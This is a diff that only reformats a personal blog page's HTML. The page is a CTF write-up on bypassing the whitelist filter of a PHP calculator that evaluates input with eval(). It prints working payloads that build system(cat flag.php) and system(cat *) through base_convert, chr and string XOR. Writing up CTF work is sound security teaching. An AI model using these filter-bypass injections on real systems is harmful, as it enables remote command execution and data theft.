@@ -1,112 +1,292 @@
-<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="description" content="Portfolio and personal site of Jeremiah Crowell"><meta property="og:title" content="Hacking &#34;PHP Calculator&#34; // CTF writeup"><meta name="twitter:card" content="summary_large_image"><link rel="icon" type="image/x-icon" href="/favicon.ico"><link href="https://fonts.googleapis.com/css2?family=Libre+Franklin:wght@400&display=swap" rel="stylesheet"><title>Hacking &quot;PHP Calculator&quot; // CTF writeup</title><!-- Google Analytics --><script async src="https://www.googletagmanager.com/gtag/js?id=G-T5TJ893ZKF"></script><script>
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta
+      name="description"
+      content="Portfolio and personal site of Jeremiah Crowell"
+    />
+    <meta
+      property="og:title"
+      content="Hacking &#34;PHP Calculator&#34; // CTF writeup"
+    />
+    <meta name="twitter:card" content="summary_large_image" />
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Libre+Franklin:wght@400&display=swap"
+      rel="stylesheet"
+    />
+    <title>Hacking &quot;PHP Calculator&quot; // CTF writeup</title>
+    <!-- Google Analytics -->
+    <script
+      async
+      src="https://www.googletagmanager.com/gtag/js?id=G-T5TJ893ZKF"
+    ></script>
+    <script>
       window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
+      function gtag() {
+        dataLayer.push(arguments);
+      }
       gtag('js', new Date());
       gtag('config', 'G-T5TJ893ZKF');
-    </script><link rel="stylesheet" href="/_astro/Layout.C5WS6v4p.css"></head> <body class="bg-neutral-950 text-blue-50 font-librefranklin"> <div class="stars set1"></div> <div class="stars2 set2"></div> <div class="stars3 set3"></div> <div class="tailstars"></div> <div class="container mx-auto my-12 px-5 max-w-3xl"> <header class="flex flex-col items-center">  <a href="/"> <img src="/images/hs7.jpg" class="rounded-[80px] transition-all hover:-translate-y-1 hover:rounded-[30px] duration-300" height="108" width="108" alt="Jeremiah Crowell"> </a> <h2 class="text-2xl text-nowrap font-bold p-5"> <a href="/" class="text-inherit"> Jeremiah Crowell </a> </h2>  </header> <main>  <article class="prose prose-invert prose-lg max-w-none
-    [&>h1]:text-4xl [&>h1]:text-center [&>h1]:font-bold [&>h1]:pb-3
-    [&>h2]:text-3xl [&>h2]:font-bold [&>h2]:pt-2 [&>h2]:pb-1
-    [&>p]:text-lg [&>p]:leading-relaxed [&>p]:py-0
-    [&>ul]:list-disc [&>ul]:list-outside [&>ul]:ms-8 [&>ul]:py-1 [&>ul]:text-lg
-    [&_a]:cool-link
-    [&_img]:py-2 [&_img]:mx-auto [&_img]:w-4/5
-    [&_p_code]:font-mono [&_p_code]:bg-gray-700 [&_p_code]:px-1.5 [&_p_code]:py-0.5 [&_p_code]:rounded [&_p_code]:text-sm [&_p_code]:font-normal [&_p_code]:before:content-[''] [&_p_code]:after:content-['']
-    [&_li_code]:font-mono [&_li_code]:bg-gray-700 [&_li_code]:px-1.5 [&_li_code]:py-0.5 [&_li_code]:rounded [&_li_code]:text-sm [&_li_code]:font-normal [&_li_code]:before:content-[''] [&_li_code]:after:content-['']
-    [&_pre]:bg-transparent [&_pre]:p-0 [&_pre]:my-4
-    [&_pre_code]:bg-gray-800 [&_pre_code]:block [&_pre_code]:p-4 [&_pre_code]:rounded-lg [&_pre_code]:overflow-x-auto [&_pre_code]:border-0 [&_pre_code]:font-normal [&_pre_code]:before:content-[''] [&_pre_code]:after:content-['']
-    [&_pre_.line]:bg-transparent
-    [&_table]:mx-auto [&_table]:w-11/12 [&_table]:text-left [&_table]:my-3
-    [&_tr]:bg-white [&_tr]:border-b [&_tr]:dark:bg-gray-800 [&_tr]:dark:border-gray-700
-    [&_th]:px-6 [&_th]:py-4 [&_th]:text-gray-700 [&_th]:bg-gray-50 [&_th]:dark:bg-gray-700 [&_th]:dark:text-gray-400
-    [&_td]:px-6 [&_td]:py-4
-  "> <h1>Hacking &quot;PHP Calculator&quot; // CTF writeup</h1> <p class="text-gray-400 text-lg pb-3"> <time datetime="2023-10-27">Oct 27, 2023</time> </p> <p><em>[Updated in 2023, originally written in 2021 on my old site]</em></p>
-<hr>
-<p>This is a writeup for the web hacking challenge ‘PHP Calculator’, one of the web hacking challenges
-in the <a href="https://sigpwny.com/">SIGPwny</a> CTF.</p>
-<p><a href="http://phpcalc.chal.sigpwny.com/">Here’s</a> a link to the challenge, if it’s still hosted. Obviously, this article is a big spoiler.</p>
-<h2 id="looking-for-an-attack">Looking for an attack</h2>
-<p>The target for this challenge is a basic calculator web app. It works as you’d expect, and even has some cool trig functions you can use. It also has a link to the PHP source code right at the top.</p>
-<p><img src="/images/phpc1.png" alt=""></p>
-<p>On the backend, it takes the URL parameter <code>expr</code>, and sets the calculator’s output to be the result of applying <code>check_expr()</code>.</p>
-<p><img src="/images/phpc2.png" alt=""></p>
-<p><code>check_expr()</code> puts our input through 3 tests.</p>
-<ul>
-<li>Must be shorter than 0135 (octal, in decimal 93) characters long</li>
-<li>Cannot have any spaces, tabs, newlines, backslashes, quotes, or brackets</li>
-<li>If there are letters or underscores, then the entire word that they make up must be in an approved list of strings.
-These strings are the <a href="http://php.net/manual/en/ref.math.php">PHP math functions</a>.
-(about 50 functions, mostly things like ‘sin’, ‘cos’, ‘pow’, ‘rand’, ‘floor’, etc.)</li>
-</ul>
-<p>If we pass these checks, our input is sent to a function called evaluate_expr(), <em>which just does a literal <code>eval()</code> of the input string</em>,
-interpreting it as PHP code. Red flag! Our goal now is to get some code in here that will return the flag file’s contents.</p>
-<h2 id="testing-ideas">Testing ideas</h2>
-<p>It would be nice to just send a <code>system()</code> call in here and be done, but the real challenge is in circumventing the ‘security’ implemented in <code>check_expr</code>.</p>
-<p>I couldn’t find a way around the strict regex. Remember, any character or symbol that isn’t a function in the whitelist is denied. So I thought to work with what we’re given, and started looking through the PHP <code>math</code> functions for something to construct a payload with.</p>
-<p>We’re looking for any function that returns something other than just a number - but like I said, most of these are just plain old math functions with numeric outputs.</p>
-<p>The first thing that jumped out at me was the function <code>base_convert</code></p>
-<p><img src="/images/phpc3.png" alt=""></p>
-<p>As you can see, this returns a string, not a number! And better yet, if we set the <code>$to_base</code> argument to 36,
-the number gets converted into an alphanumeric sequence that can include all characters a-z!
-This means, using an online base36 to decimal converter, we can find numbers that, when put through this
-(whitelisted) function, return whatever lowercase word we want.</p>
-<p><img src="/images/phpc4.png" alt=""></p>
-<p>Awesome! Let’s do ‘system(ls)’!</p>
-<p><img src="/images/phpc5.png" alt=""></p>
-<p>Amazing! We can even see the file <code>flag.php</code>, just waiting for us!</p>
-<p>At this point, I think I have it. All we have to do is construct <code>system(cat flag.php)</code>.</p>
-<p>Unfortunately, this requires the space and period characters, which we can’t make from base_convert().
-But, we <em>can</em> make <code>chr()</code>, which can take in an ASCII value and give us any character, great! Now, we can construct a full payload that is a concatenation of these parts (<code>.</code> is the string concatenation operator in PHP, apparently)</p>
-<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#79B8FF">base_convert</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1751504350</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">36</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">.</span><span style="color:#6A737D"> // system</span></span>
+    </script>
+    <link rel="stylesheet" href="/_astro/Layout.C5WS6v4p.css" />
+  </head>
+  <body class="bg-neutral-950 text-blue-50 font-librefranklin">
+    <div class="stars set1"></div>
+    <div class="stars2 set2"></div>
+    <div class="stars3 set3"></div>
+    <div class="tailstars"></div>
+    <div class="container mx-auto my-12 px-5 max-w-3xl">
+      <header class="flex flex-col items-center">
+        <a href="/">
+          <img
+            src="/images/hs7.jpg"
+            class="rounded-[80px] transition-all hover:-translate-y-1 hover:rounded-[30px] duration-300"
+            height="108"
+            width="108"
+            alt="Jeremiah Crowell"
+          />
+        </a>
+        <h2 class="text-2xl text-nowrap font-bold p-5">
+          <a href="/" class="text-inherit"> Jeremiah Crowell </a>
+        </h2>
+      </header>
+      <main>
+        <article
+          class="prose prose-invert prose-lg max-w-none [&>h1]:text-4xl [&>h1]:text-center [&>h1]:font-bold [&>h1]:pb-3 [&>h2]:text-3xl [&>h2]:font-bold [&>h2]:pt-2 [&>h2]:pb-1 [&>p]:text-lg [&>p]:leading-relaxed [&>p]:py-0 [&>ul]:list-disc [&>ul]:list-outside [&>ul]:ms-8 [&>ul]:py-1 [&>ul]:text-lg [&_a]:cool-link [&_img]:py-2 [&_img]:mx-auto [&_img]:w-4/5 [&_p_code]:font-mono [&_p_code]:bg-gray-700 [&_p_code]:px-1.5 [&_p_code]:py-0.5 [&_p_code]:rounded [&_p_code]:text-sm [&_p_code]:font-normal [&_p_code]:before:content-[''] [&_p_code]:after:content-[''] [&_li_code]:font-mono [&_li_code]:bg-gray-700 [&_li_code]:px-1.5 [&_li_code]:py-0.5 [&_li_code]:rounded [&_li_code]:text-sm [&_li_code]:font-normal [&_li_code]:before:content-[''] [&_li_code]:after:content-[''] [&_pre]:bg-transparent [&_pre]:p-0 [&_pre]:my-4 [&_pre_code]:bg-gray-800 [&_pre_code]:block [&_pre_code]:p-4 [&_pre_code]:rounded-lg [&_pre_code]:overflow-x-auto [&_pre_code]:border-0 [&_pre_code]:font-normal [&_pre_code]:before:content-[''] [&_pre_code]:after:content-[''] [&_pre_.line]:bg-transparent [&_table]:mx-auto [&_table]:w-11/12 [&_table]:text-left [&_table]:my-3 [&_tr]:bg-white [&_tr]:border-b [&_tr]:dark:bg-gray-800 [&_tr]:dark:border-gray-700 [&_th]:px-6 [&_th]:py-4 [&_th]:text-gray-700 [&_th]:bg-gray-50 [&_th]:dark:bg-gray-700 [&_th]:dark:text-gray-400 [&_td]:px-6 [&_td]:py-4"
+        >
+          <h1>Hacking &quot;PHP Calculator&quot; // CTF writeup</h1>
+          <p class="text-gray-400 text-lg pb-3">
+            <time datetime="2023-10-27">Oct 27, 2023</time>
+          </p>
+          <p>
+            <em
+              >[Updated in 2023, originally written in 2021 on my old site]</em
+            >
+          </p>
+          <hr />
+          <p>
+            This is a writeup for the web hacking challenge ‘PHP Calculator’,
+            one of the web hacking challenges in the
+            <a href="https://sigpwny.com/">SIGPwny</a> CTF.
+          </p>
+          <p>
+            <a href="http://phpcalc.chal.sigpwny.com/">Here’s</a> a link to the
+            challenge, if it’s still hosted. Obviously, this article is a big
+            spoiler.
+          </p>
+          <h2 id="looking-for-an-attack">Looking for an attack</h2>
+          <p>
+            The target for this challenge is a basic calculator web app. It
+            works as you’d expect, and even has some cool trig functions you can
+            use. It also has a link to the PHP source code right at the top.
+          </p>
+          <p><img src="/images/phpc1.png" alt="" /></p>
+          <p>
+            On the backend, it takes the URL parameter <code>expr</code>, and
+            sets the calculator’s output to be the result of applying
+            <code>check_expr()</code>.
+          </p>
+          <p><img src="/images/phpc2.png" alt="" /></p>
+          <p><code>check_expr()</code> puts our input through 3 tests.</p>
+          <ul>
+            <li>
+              Must be shorter than 0135 (octal, in decimal 93) characters long
+            </li>
+            <li>
+              Cannot have any spaces, tabs, newlines, backslashes, quotes, or
+              brackets
+            </li>
+            <li>
+              If there are letters or underscores, then the entire word that
+              they make up must be in an approved list of strings. These strings
+              are the
+              <a href="http://php.net/manual/en/ref.math.php"
+                >PHP math functions</a
+              >. (about 50 functions, mostly things like ‘sin’, ‘cos’, ‘pow’,
+              ‘rand’, ‘floor’, etc.)
+            </li>
+          </ul>
+          <p>
+            If we pass these checks, our input is sent to a function called
+            evaluate_expr(),
+            <em
+              >which just does a literal <code>eval()</code> of the input
+              string</em
+            >, interpreting it as PHP code. Red flag! Our goal now is to get
+            some code in here that will return the flag file’s contents.
+          </p>
+          <h2 id="testing-ideas">Testing ideas</h2>
+          <p>
+            It would be nice to just send a <code>system()</code> call in here
+            and be done, but the real challenge is in circumventing the
+            ‘security’ implemented in <code>check_expr</code>.
+          </p>
+          <p>
+            I couldn’t find a way around the strict regex. Remember, any
+            character or symbol that isn’t a function in the whitelist is
+            denied. So I thought to work with what we’re given, and started
+            looking through the PHP <code>math</code> functions for something to
+            construct a payload with.
+          </p>
+          <p>
+            We’re looking for any function that returns something other than
+            just a number - but like I said, most of these are just plain old
+            math functions with numeric outputs.
+          </p>
+          <p>
+            The first thing that jumped out at me was the function
+            <code>base_convert</code>
+          </p>
+          <p><img src="/images/phpc3.png" alt="" /></p>
+          <p>
+            As you can see, this returns a string, not a number! And better yet,
+            if we set the <code>$to_base</code> argument to 36, the number gets
+            converted into an alphanumeric sequence that can include all
+            characters a-z! This means, using an online base36 to decimal
+            converter, we can find numbers that, when put through this
+            (whitelisted) function, return whatever lowercase word we want.
+          </p>
+          <p><img src="/images/phpc4.png" alt="" /></p>
+          <p>Awesome! Let’s do ‘system(ls)’!</p>
+          <p><img src="/images/phpc5.png" alt="" /></p>
+          <p>
+            Amazing! We can even see the file <code>flag.php</code>, just
+            waiting for us!
+          </p>
+          <p>
+            At this point, I think I have it. All we have to do is construct
+            <code>system(cat flag.php)</code>.
+          </p>
+          <p>
+            Unfortunately, this requires the space and period characters, which
+            we can’t make from base_convert(). But, we <em>can</em> make
+            <code>chr()</code>, which can take in an ASCII value and give us any
+            character, great! Now, we can construct a full payload that is a
+            concatenation of these parts (<code>.</code> is the string
+            concatenation operator in PHP, apparently)
+          </p>
+          <pre
+            class="astro-code github-dark"
+            style="background-color: #24292e; color: #e1e4e8; overflow-x: auto"
+            tabindex="0"
+            data-language="php"
+          ><code><span class="line"><span style="color:#79B8FF">base_convert</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1751504350</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">36</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">.</span><span style="color:#6A737D"> // system</span></span>
 <span class="line"><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">base_convert</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">15941</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">36</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">.</span><span style="color:#6A737D">     // (cat</span></span>
 <span class="line"><span style="color:#79B8FF">base_convert</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">16191</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">36</span><span style="color:#E1E4E8">)(</span><span style="color:#79B8FF">32</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">.</span><span style="color:#6A737D">  // chr(32)  /space</span></span>
 <span class="line"><span style="color:#79B8FF">base_convert</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">727432</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">36</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">.</span><span style="color:#6A737D">     // flag    </span></span>
 <span class="line"><span style="color:#79B8FF">base_convert</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">16191</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">36</span><span style="color:#E1E4E8">)(</span><span style="color:#79B8FF">46</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">.</span><span style="color:#6A737D">  // chr(46)  / period</span></span>
 <span class="line"><span style="color:#79B8FF">base_convert</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">33037</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">36</span><span style="color:#E1E4E8">))      </span><span style="color:#6A737D">// php)</span></span>
 <span class="line"><span style="color:#6A737D">// => system(cat flag.php)</span></span></code></pre>
-<p>Great, just paste it in, and…</p>
-<p><img src="/images/phpc6.png" alt=""></p>
-<p>Too long. The payload has to be less than 93 characters. Well, we don’t necessarily need get
-<em>just</em> <code>flag.php</code>’s contents. How about <code>system(cat *)</code>, which is:</p>
-<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#79B8FF">base_convert</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1751504350</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">36</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">.</span><span style="color:#6A737D"> // system</span></span>
+          <p>Great, just paste it in, and…</p>
+          <p><img src="/images/phpc6.png" alt="" /></p>
+          <p>
+            Too long. The payload has to be less than 93 characters. Well, we
+            don’t necessarily need get <em>just</em> <code>flag.php</code>’s
+            contents. How about <code>system(cat *)</code>, which is:
+          </p>
+          <pre
+            class="astro-code github-dark"
+            style="background-color: #24292e; color: #e1e4e8; overflow-x: auto"
+            tabindex="0"
+            data-language="php"
+          ><code><span class="line"><span style="color:#79B8FF">base_convert</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1751504350</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">36</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">.</span><span style="color:#6A737D"> // system</span></span>
 <span class="line"><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">base_convert</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">15941</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">36</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">.</span><span style="color:#6A737D">     // (cat</span></span>
 <span class="line"><span style="color:#79B8FF">base_convert</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">16191</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">36</span><span style="color:#E1E4E8">)(</span><span style="color:#79B8FF">32</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">.</span><span style="color:#6A737D">  // chr(32) = space</span></span>
 <span class="line"><span style="color:#79B8FF">base_convert</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">16191</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">36</span><span style="color:#E1E4E8">)(</span><span style="color:#79B8FF">42</span><span style="color:#E1E4E8">))  </span><span style="color:#6A737D">// chr(42) = *</span></span></code></pre>
-<p>This is unfortunately still too long - 117 characters. So close!  This is where I really got stuck.
-I tried other approaches, looked through all kinds of possible PHP or linux commands that could be useful
-and shorter, but I eventually found that
-to get further, we’ll have to get creative with how we can create strings.</p>
-<h2 id="getting-creative">Getting creative</h2>
-<p>So, the real issue here is that putting in a single special character, like a space or an asterisk,
-currently requires 29 characters of payload, as in <code>base_convert(16191,10,36)(42)</code> is needed to make <code>*</code>.
-It would be really, really awesome if I could somehow <em>modify</em> a whole string, and convert some characters
-into new ones. E.g. use <code>base convert()</code> to create something like <code>z7fkp</code>, perform some function on it, and it becomes
-<code>cat *</code></p>
-<p>This is starting to sound very encryption-ey, and I thought about XORing strings together. The <code>^</code> operator
-is in fact allowed, and some quick testing showed we can new characters this way.</p>
-<p>Before, the only output I could get is lowercase letters, since that’s what <code>base_convert</code> returns, but you can see here that XORing two <code>base_convert</code> outputs gets us a <em>capital</em> F!</p>
-<p><img src="/images/phpc7.png" alt=""></p>
-<p>I found that PHP XORs strings together by just XORing each character’s ASCII together, left to right. Using this info, I wrote a
-Python script that tried all the possible combinations of XORs of characters we can make with base_convert (0-9, a-z)</p>
-<p><img src="/images/phpc8.png" alt=""></p>
-<p>Hmm. Mostly control characters, a few capital letters, and none of the precious spaces, asterisks, or lowercase letters we need.</p>
-<p>Well, how about 2 XORs?
-Since 36*36*36 is a big number, I just searched to see if there was some combination that would produce an asterisk. And:</p>
-<p><img src="/images/phpc9.png" alt=""></p>
-<p><code>'1'^'a'^'z'</code> gives us an <code>*</code>! I made a quick change and had it look up the rest of the characters in
-<code>cat *</code>, and found this combination.</p>
-<p><img src="/images/phpc10.png" alt=""></p>
-<p>Taking each column to be a string of text, we essentially just need to have <code>'11111'^'111aa'^'catpz'</code>, and we
-should get a <code>cat *</code> to put in our <code>base_convert</code>ed <code>system()</code> call!</p>
-<p>Also, I noticed that <code>11111</code> and <code>111aa</code> are valid hexadecimal numbers, and another allowed function is
-<code>dechex()</code>, which we can use to make these strings without having to type the longer <code>base_convert</code>.</p>
-<p>So! Here’s the final payload:</p>
-<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#79B8FF">base_convert</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1751504350</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">36</span><span style="color:#E1E4E8">) </span><span style="color:#6A737D">// system</span></span>
+          <p>
+            This is unfortunately still too long - 117 characters. So close!
+            This is where I really got stuck. I tried other approaches, looked
+            through all kinds of possible PHP or linux commands that could be
+            useful and shorter, but I eventually found that to get further,
+            we’ll have to get creative with how we can create strings.
+          </p>
+          <h2 id="getting-creative">Getting creative</h2>
+          <p>
+            So, the real issue here is that putting in a single special
+            character, like a space or an asterisk, currently requires 29
+            characters of payload, as in
+            <code>base_convert(16191,10,36)(42)</code> is needed to make
+            <code>*</code>. It would be really, really awesome if I could
+            somehow <em>modify</em> a whole string, and convert some characters
+            into new ones. E.g. use <code>base convert()</code> to create
+            something like <code>z7fkp</code>, perform some function on it, and
+            it becomes <code>cat *</code>
+          </p>
+          <p>
+            This is starting to sound very encryption-ey, and I thought about
+            XORing strings together. The <code>^</code> operator is in fact
+            allowed, and some quick testing showed we can new characters this
+            way.
+          </p>
+          <p>
+            Before, the only output I could get is lowercase letters, since
+            that’s what <code>base_convert</code> returns, but you can see here
+            that XORing two <code>base_convert</code> outputs gets us a
+            <em>capital</em> F!
+          </p>
+          <p><img src="/images/phpc7.png" alt="" /></p>
+          <p>
+            I found that PHP XORs strings together by just XORing each
+            character’s ASCII together, left to right. Using this info, I wrote
+            a Python script that tried all the possible combinations of XORs of
+            characters we can make with base_convert (0-9, a-z)
+          </p>
+          <p><img src="/images/phpc8.png" alt="" /></p>
+          <p>
+            Hmm. Mostly control characters, a few capital letters, and none of
+            the precious spaces, asterisks, or lowercase letters we need.
+          </p>
+          <p>
+            Well, how about 2 XORs? Since 36*36*36 is a big number, I just
+            searched to see if there was some combination that would produce an
+            asterisk. And:
+          </p>
+          <p><img src="/images/phpc9.png" alt="" /></p>
+          <p>
+            <code>'1'^'a'^'z'</code> gives us an <code>*</code>! I made a quick
+            change and had it look up the rest of the characters in
+            <code>cat *</code>, and found this combination.
+          </p>
+          <p><img src="/images/phpc10.png" alt="" /></p>
+          <p>
+            Taking each column to be a string of text, we essentially just need
+            to have <code>'11111'^'111aa'^'catpz'</code>, and we should get a
+            <code>cat *</code> to put in our <code>base_convert</code>ed
+            <code>system()</code> call!
+          </p>
+          <p>
+            Also, I noticed that <code>11111</code> and <code>111aa</code> are
+            valid hexadecimal numbers, and another allowed function is
+            <code>dechex()</code>, which we can use to make these strings
+            without having to type the longer <code>base_convert</code>.
+          </p>
+          <p>So! Here’s the final payload:</p>
+          <pre
+            class="astro-code github-dark"
+            style="background-color: #24292e; color: #e1e4e8; overflow-x: auto"
+            tabindex="0"
+            data-language="php"
+          ><code><span class="line"><span style="color:#79B8FF">base_convert</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">1751504350</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">36</span><span style="color:#E1E4E8">) </span><span style="color:#6A737D">// system</span></span>
 <span class="line"><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">dechex</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">69905</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">^</span><span style="color:#6A737D">                // (11111^</span></span>
 <span class="line"><span style="color:#79B8FF">dechex</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">70058</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">^</span><span style="color:#6A737D">                 // 111aa^</span></span>
 <span class="line"><span style="color:#79B8FF">base_convert</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">20660471</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">36</span><span style="color:#E1E4E8">))  </span><span style="color:#6A737D">// catpz)</span></span>
 <span class="line"><span style="color:#6A737D">// => system(cat *)</span></span></code></pre>
-<p>This comes in at a cool 88 characters long. Below you can see it plugged into the site, and alongside
-the broken page, at the top of the source, we have:</p>
-<p><img src="/images/phpc11.png" alt=""></p>
-<p>The solution flag!</p>
-<p>Thank you for reading, I hope you enjoyed! :)</p> </article>  </main> <div class="my-8"> <a class="text-xl cool-link" href="/">← Back to home</a> </div> </div> </body></html>
+          <p>
+            This comes in at a cool 88 characters long. Below you can see it
+            plugged into the site, and alongside the broken page, at the top of
+            the source, we have:
+          </p>
+          <p><img src="/images/phpc11.png" alt="" /></p>
+          <p>The solution flag!</p>
+          <p>Thank you for reading, I hope you enjoyed! :)</p>
+        </article>
+      </main>
+      <div class="my-8">
+        <a class="text-xl cool-link" href="/">← Back to home</a>
+      </div>
+    </div>
+  </body>
+</html>
